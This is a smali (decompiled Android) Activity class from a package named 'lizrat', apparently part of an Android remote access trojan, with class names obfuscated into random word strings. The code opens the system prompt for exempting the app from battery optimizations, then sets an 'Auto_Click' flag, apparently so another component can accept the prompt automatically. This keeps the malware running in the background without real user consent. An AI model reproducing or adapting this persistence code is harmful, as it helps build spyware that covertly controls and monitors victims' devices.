.class public LLiz0rd/lizrat/straightbgettingcpurpleigoogleklonemlowestbordinarygamateurjalbaniafcapertrainedxbreedwrgh17;
.super Landroid/app/Activity;
.source "straightbgettingcpurpleigoogleklonemlowestbordinarygamateurjalbaniafcapertrainedxbreedwrgh17.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 11
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 3

    .line 16
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 22
    :try_start_0
    invoke-static {p0}, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->is_dozemode(Landroid/content/Context;)Z

    move-result p1

    if-nez p1, :cond_0

    .line 25
    new-instance p1, Landroid/content/Intent;

    const-string v0, "android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "package:"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 27
    invoke-virtual {p0}, LLiz0rd/lizrat/straightbgettingcpurpleigoogleklonemlowestbordinarygamateurjalbaniafcapertrainedxbreedwrgh17;->getPackageName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    invoke-direct {p1, v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    const/high16 v0, 0x10000000

    .line 28
    invoke-virtual {p1, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v0, 0x40000000    # 2.0f

    .line 30
    invoke-virtual {p1, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 32
    invoke-virtual {p0, p1}, LLiz0rd/lizrat/straightbgettingcpurpleigoogleklonemlowestbordinarygamateurjalbaniafcapertrainedxbreedwrgh17;->startActivity(Landroid/content/Intent;)V

    const/4 p1, 0x1

    .line 33
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    sput-object p1, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew32;->membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew32Auto_Click:Ljava/lang/Boolean;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 47
    :catch_0
    :cond_0
    invoke-virtual {p0}, LLiz0rd/lizrat/straightbgettingcpurpleigoogleklonemlowestbordinarygamateurjalbaniafcapertrainedxbreedwrgh17;->finish()V

    return-void
.end method
